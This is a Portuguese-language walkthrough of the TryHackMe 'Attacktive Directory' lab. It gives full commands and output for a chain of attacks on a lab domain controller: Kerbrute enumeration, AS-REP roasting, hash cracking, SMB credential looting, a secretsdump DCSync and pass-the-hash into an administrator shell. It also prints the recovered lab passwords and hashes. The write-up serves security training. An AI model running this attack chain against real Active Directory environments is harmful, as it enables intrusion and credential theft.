---
title: "TryHackMe — Attacktive Directory Walkthrough"
description: "Resolução completa da sala Attacktive Directory do TryHackMe: recon completo com Nmap, CrackMapExec, Kerbrute, AS-REP Roasting, exploração de SMB e Secretsdump."
pubDate: 2026-08-14
category: "Machine Write-ups"
tags: ["TryHackMe", "Active Directory", "Kerbrute", "Impacket", "Secretsdump", "Evil-WinRM"]
---

## Introdução

Neste guia completo, cobriremos todas as etapas da sala **Attacktive Directory** do TryHackMe. O laboratório é focado em explorar um controlador de domínio Windows desatualizado, utilizando táticas de Active Directory como enumeração do Kerberos, AS-REP Roasting, enumeração de compartilhamentos de arquivos e extração de hashes do NTDS.dit.

---

## 1. Reconhecimento Inicial: Scanning com Nmap

Começamos identificando as portas abertas e serviços rodando no alvo usando o comando `nmap` completo:

```bash
nmap -Pn -A -p- -T4 10.64.145.19
```

Saída completa do terminal:

```text
Nmap scan report for 10.64.145.19
Host is up (0.00068s latency).
Not shown: 65508 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-09 21:11:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-09T21:14:12+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-02-08T21:03:47
|_Not valid after:  2026-08-10T21:03:47
|_ssl-date: 2026-02-09T21:14:26+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
```

![Reconhecimento Inicial com Nmap](../../assets/blog/thm-attacktive-directory/1.png)

A partir da saída do `nmap`, constatamos a presença do Active Directory Domain Controller rodando no domínio `spookysec.local`.

---

## 2. Descobrindo o Nome do Domínio com CrackMapExec

Usamos o `crackmapexec` com o módulo SMB para consultar o alvo de forma não invasiva e identificar a estrutura LDAP do domínio:

```bash
crackmapexec smb 10.64.145.19
```

![Descoberta do nome do domínio](../../assets/blog/thm-attacktive-directory/2.png)

Essa consulta confirma a presença do domínio: **`spookysec.local`**.

---

## 3. Enumeração de Usuários via Kerberos (Kerbrute)

Como não temos nenhuma credencial válida para o domínio, vamos enumerar usuários válidos através do Kerberos usando a ferramenta **Kerbrute**. O Kerberos nos permite testar nomes de usuário e validar se existem ou não sem disparar bloqueios de conta (account lockouts).

Usamos a wordlist padrão fornecida:

```bash
kerbrute userenum -d spookysec.local --dc 10.64.145.19 users.txt
```

![Enumeração do Kerbrute](../../assets/blog/thm-attacktive-directory/3.png)

### Contas de Usuários Válidas Identificadas:

- `james@spookysec.local`
- `svc-admin@spookysec.local`
- `robin@spookysec.local`
- `darkstar@spookysec.local`
- `administrator@spookysec.local`
- `backup@spookysec.local`
- `paradox@spookysec.local`
- `ori@spookysec.local`

---

## 4. AS-REP Roasting

O ataque **AS-REP Roasting** visa contas do domínio que estão configuradas com o atributo *"Do not require Kerberos preauthentication"* (Não exigir pré-autenticação Kerberos). Isso nos permite solicitar um ticket TGT diretamente sem fornecer a senha correspondente. O ticket retornado é criptografado com o hash NTLM do próprio usuário e pode ser decifrado offline.

Utilizamos o script **GetNPUsers.py** do Impacket:

```bash
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.64.145.19 -usersfile valid_users.txt -request
```

![AS-REP Roasting via GetNPUsers](../../assets/blog/thm-attacktive-directory/4.png)

Conseguimos recuperar o hash do ticket para a conta do usuário serviço `svc-admin`:

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b3f30267166c6c8127dfaee88962a3c9$0c298c77a5a2f2dc61329e3b7587fd5cf883cd7ffef4a55fb67d433d4155edce8cf36c56f1dda2837a95b763d5085a88ea9c5dfdabfc89eec3b87ad1f00a484e3383c5a4ba56c81fb7d94fde4999ba6c8a4519062a5a5b3fc03a9df0a8b8503449e4106433324d4be3d685ec15f5246f473fdaa769d7b22fc31bf8ad42404506347f6bd65365b186ea4018236c7798a660cfa952505b51431b8f9aceaf7c8f4a2791e568778cd8cee2af6cea7745071995d55682f57c1777428705192479cbc90d9311b3a1e28235e239fc6b18128f96dd8115fe8f73e771be1ea7138e70d1e8884258ef594c4c42f364f6fd4fdbdbfff546
```

---

## 5. Cracking do Hash AS-REP

Utilizamos o **Hashcat** no modo `18200` (específico para hashes do tipo Kerberos 5 AS-REP) com a wordlist padrão fornecida:

```bash
hashcat -m 18200 Hash.txt passwords.txt
```

![Quebra de hash com Hashcat](../../assets/blog/thm-attacktive-directory/5.png)

Após alguns instantes, o hashcat revela com sucesso as credenciais limpas da conta:
- **Username**: `svc-admin`
- **Password**: `management2005`

---

## 6. Enumeração de Compartilhamentos SMB

Agora que possuímos uma credencial válida no domínio, podemos realizar conexões autenticadas para vasculhar compartilhamentos SMB usando `netexec`:

```bash
netexec smb 10.64.145.19 -u 'svc-admin' -p 'management2005' --shares
```

![Lista de compartilhamentos SMB](../../assets/blog/thm-attacktive-directory/6.png)

Identificamos a pasta compartilhada `backup`. Usamos o utilitário `smbclient` para acessá-la:

```bash
smbclient //10.64.145.19/backup -U 'svc-admin'
```

![Listando conteúdo no compartilhamento de backup](../../assets/blog/thm-attacktive-directory/7.png)

Dentro da pasta de compartilhamento, localizamos o arquivo `backup_credentials.txt` contendo a seguinte cadeia codificada em base64:

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

![Conteúdo codificado em Base64](../../assets/blog/thm-attacktive-directory/8.png)

Ao decodificarmos o base64, recuperamos as credenciais da conta de administrador de backup:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

- **Username**: `backup`
- **Password**: `backup2517860`

---

## 7. Extração de Hashes do NTDS.dit (Secretsdump)

O usuário `backup` é uma conta configurada com permissão especial de replicação do Domain Controller. Com este privilégio (especificamente o *"Replicating Directory Changes All"*), podemos simular uma sincronização entre Domain Controllers para extrair todos os hashes NTLM salvos do Active Directory.

Usamos o script **secretsdump.py** da suíte Impacket:

```bash
secretsdump.py spookysec.local/backup:backup2517860@10.64.145.19
```

![Dumping de hashes de senhas via Secretsdump](../../assets/blog/thm-attacktive-directory/9.png)

Isso nos traz os hashes NTLM locais do banco de dados, incluindo o hash do **Administrador**:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

---

## 8. Shell de Administrador (Evil-WinRM)

Com o hash NTLM do administrador obtido, efetuamos o login sem a necessidade de reverter a senha em texto claro, fazendo uso do ataque **Pass-the-Hash (PtH)** via **Evil-WinRM**:

```bash
evil-winrm -i 10.64.145.19 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
```

![Evil-WinRM acesso administrativo](../../assets/blog/thm-attacktive-directory/10.png)

Acesso remoto administrativo garantido!

---

## 9. Coleta das Flags

### Flag do Administrador (root.txt)
Caminho: `C:\Users\Administrator\Desktop\root.txt`

![Flag do Administrador root.txt](../../assets/blog/thm-attacktive-directory/11.png)

### Flag da Conta Backup (PrivESC.txt)
Caminho: `C:\Users\backup\Desktop\PrivESC.txt`

![Flag de elevação de privilégio PrivESC.txt](../../assets/blog/thm-attacktive-directory/12.png)

### Flag do Usuário svc-admin (user.txt.txt)
Caminho: `C:\Users\svc-admin\Desktop\user.txt.txt`

![Flag de Usuário svc-admin](../../assets/blog/thm-attacktive-directory/12.png)

---

## Resumo das Descobertas
Nesta invasão a um ambiente Active Directory, exploramos falhas críticas:
- Falta de restrição de enumeração de nomes no Kerberos (Kerbrute).
- Configuração de pré-autenticação desabilitada (AS-REP Roasting).
- Falha na proteção de arquivos de credenciais no SMB.
- Delegação inadequada de privilégios de replicação AD (DCSync).
